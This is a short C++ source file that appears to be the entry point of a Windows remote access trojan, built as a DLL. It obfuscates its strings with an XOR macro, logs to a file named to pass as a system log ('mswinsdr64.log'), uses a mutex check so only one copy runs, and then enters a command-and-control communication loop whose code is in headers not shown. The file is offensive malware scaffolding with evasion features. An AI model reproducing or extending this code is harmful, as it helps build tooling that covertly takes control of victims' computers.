#include "rat.hpp"
#include "comms.hpp"
#include "xor_logger.hpp"
#include <Windows.h>

bool run() {
    
    // initialize logging
    common::InitializeLogger(XOR_LIT("mswinsdr64.log"), Settings::key);


    common::LogInfo(XOR_LIT("Initialized logger."));

    // check if mutex exists/create if not
    if (!Guardrails::CheckCreateMutex())
        exit(1);

    // enter coms loop
    Communication::InitCommunicationLoop();
    return true;
}

extern "C"
bool DllMain(HINSTANCE, DWORD, void*){
    return true;
}